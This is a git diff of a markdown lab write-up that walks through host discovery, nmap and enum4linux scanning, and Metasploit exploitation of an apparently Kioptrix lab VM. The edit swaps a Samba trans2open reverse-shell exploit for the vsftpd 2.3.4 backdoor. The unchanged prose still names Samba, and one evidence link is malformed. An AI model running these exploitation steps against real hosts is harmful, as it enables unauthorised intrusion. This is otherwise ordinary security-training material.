@@ -15,35 +15,35 @@ In this phase, I identified the target and scanned for open services.
 I used `ip addr show` to indetify my IP Then `netdiscover` to find the target IP on the local NAT network.
 *   **Command:** `ip addr show ` 192.168.2.4
 *   **Command:** `sudo netdiscover -r 192.168.2.4/24`
-*   **Evidence:** [View Ip address](https://github.com/user-attachments/assets/e20bba01-f631-4805-afeb-fc48ba962b7f)
-*   **Evidence:** [View Devices](https://github.com/user-attachments/assets/00b06cd8-8ca2-4877-a327-be89cf6c1d81)
+*   **Evidence:** [View Ip address](https://github.com/user-attachments/assets/5f447afc-fa0a-4e11-bf17-49d9030fe24c)
+*   **Evidence:** [View Devices](https://github.com/user-attachments/assets/90c40bcc-63eb-4c22-9a69-5a8b9bb54d51)
 
 ### Port Scanning
 An aggressive Nmap scan revealed several interesting ports, including 80 (HTTP) and 139/445 (SMB).
-*   **Command:** `enum4linux 192.168.2.14`
-*   **Command:** `nmap -A -p- 192.168.2.14`
-*   **Evidence:** [View Enumeration](https://github.com/user-attachments/assets/ab4c41b7-ced6-421f-9c57-8837bec22810)
-*   **Evidence:** [View Nmap Scan](https://github.com/user-attachments/assets/d1f1def7-1434-4a03-94c7-11bd74902d88)
+*   **Command:** `enum4linux 192.168.2.13`
+*   **Command:** `nmap -A -p- 192.168.2.13`
+*   **Evidence:** [View Enumeration](https://github.com/user-attachments/assets/25f4874a-ae69-41ac-af15-963f2eb71219)
+*   **Evidence:** [View Nmap Scan](https://github.com/user-attachments/assets/0010925a-033e-4e61-8bc2-760cd8bc2fa4)
 
 ---
 
 ## 2. Vulnerability Analysis
 I identified an outdated version of **Samba (2.2.1)** which is vulnerable to a "trans2open" overflow.
-*   **Command:** Searchsploit samba 2.2.1
-*   **Command:** Load msfconsole > search Samba 2
-*   **Evidence:** [View Searchsploit](https://github.com/user-attachments/assets/af581393-6a41-4fc3-818f-c333a42b7a68)
-*   **Evidence:** [View msfconsole search](https://github.com/user-attachments/assets/50c87db7-88b2-4837-bed1-b60ec8dbd3b6)
+*   **Command:** Searchsploit Vsftpd 2.3.4
+*   **Command:** Load msfconsole & serach Vsftpd 2.3 
+*   **Evidence:** [View Searchsploit](https://github.com/user-attachments/assets/bdeeb27f-17ad-4670-8196-d935e61e2f84)
+*   **Evidence:** [View msfconsole search](https://github.com/user-attachments/assets/ed58c17e-0022-472b-b19e-f7f678fc5e3c)
 
 
 ---
 
 ## 3. Exploitation
 I then set the Responding Host, Listening Host loaded the payload then proceeded to Run(exploit)
-*   **Command:** `set RHOSTS 192.168.2.14 `
-*   **Command:** `set payload (linux/X86/shell/reverse-tcp)`
+*   **Command:** `use 0 (select backdoor exploit) `
+*   **Command:** `set RHOSTS 192.168.2.13`
 *   **Command:** `exploit`
-*   **Command:** `/sbin/ifconfig`
-*   **Evidence:** [View  RHOSTS](https://github.com/user-attachments/assets/1eb7a80c-1ee2-4f2f-a1e8-d37a7737715b)
-*   **Evidence:** [View Payloads](https://github.com/user-attachments/assets/31ca5941-8e8f-4c5d-8dfc-49d011098847)
-*   **Evidence:** [View Exploit](https://github.com/user-attachments/assets/27040f8b-fa7e-41f6-8bfb-aa0bc35df3bf)
-*   **Evidence:** [View Kioptrix IP](https://github.com/user-attachments/assets/af4ac459-0816-4002-bf67-878698bb17cc)
+*   **Command:** `ip addr show`
+*   **Evidence:** [View  RHOSTS](ttps://github.com/user-attachments/assets/947c721b-989d-4e65-8408-1f129e6a7ed7)
+*   **Evidence:** [View Payloads](https://github.com/user-attachments/assets/4f641558-b0a7-4a82-b471-d068c6082cba)
+*   **Evidence:** [View Exploit](https://github.com/user-attachments/assets/456947ef-285a-4bc9-aad5-af2fd3ff82e9)
+*   **Evidence:** [View Kioptrix IP](https://github.com/user-attachments/assets/d1805912-3097-4605-80c7-5d089deab579)
